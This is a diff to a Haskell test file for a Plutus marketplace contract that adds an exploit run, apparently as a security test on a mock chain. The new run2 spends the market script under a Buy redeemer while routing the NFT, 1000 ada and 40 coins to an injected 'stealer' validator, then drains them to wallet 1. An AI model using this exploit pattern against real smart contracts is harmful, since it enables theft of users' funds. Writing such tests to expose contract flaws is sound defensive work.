@@ -17,6 +17,8 @@ import qualified PlutusTx.AssocMap as AssocMap
 import PlutusTx.Prelude
 import Test.Hspec
 
+import Stealer
+
 -- Parameters of the test runs
 
 -- | Some coins for the market initial stock
@@ -198,3 +200,46 @@ spec :: Spec
 spec = do
   it "succeeds on the example run" $ do
     run1 `shouldSatisfy` maybe False isRight
+
+stealValidator :: TScripts.TypedValidator Stealer
+stealValidator = stealerValidator $ StealerParams (walletPKHash $ wallet 1)
+
+-- | Example run
+run2 :: Maybe (Either MockChainError ((), UtxoState))
+run2 = do
+  marketValidator <- mMarketValidator
+  policy <- mPolicy
+  nftAssetClass <- mNftAssetClass
+  coinsAssetClass <- mCoinsAssetClass
+
+  let runParams = RunParams marketValidator policy nftAssetClass coinsAssetClass
+
+  return . runMockChain $ do
+    -- Transaction 0: minting
+    -- Wallet 1 mints the nft and coins and shares it among the market and wallet 2
+    marketMiningTx (wallet 1) (wallet 2) runParams
+
+    [(out,dat)] <- scriptUtxosSuchThat marketValidator (\_ _ -> True)
+
+    let ada = Ada.lovelaceValueOf
+    let coins = Value.assetClassValue coinsAssetClass
+    let oneNft = Value.assetClassValue nftAssetClass 1
+
+    -- We take advantage of a purchase of golden coins to inject our validator instead of the original marketmaker one.
+    validateTxFromSkeleton $
+      TxSkel
+        (wallet 1)
+        [ SpendsScript marketValidator Market.Buy (out, dat)
+        , PaysScript stealValidator [(StealerDatum 40, oneNft <> ada 1000 <> coins 40)]
+        , PaysPK (walletPKHash (wallet 1)) (coins 10)
+        ]
+
+    [(outS,datS)] <- scriptUtxosSuchThat stealValidator (\_ _ -> True)
+
+    -- Now, everything belongs to the wallet 1, who can easily harvest the loot.
+    validateTxFromSkeleton $
+      TxSkel
+        (wallet 1)
+        [ SpendsScript stealValidator () (outS, datS)
+        , PaysPK (walletPKHash (wallet 1)) (oneNft <> ada 1000 <> coins 40)
+        ]
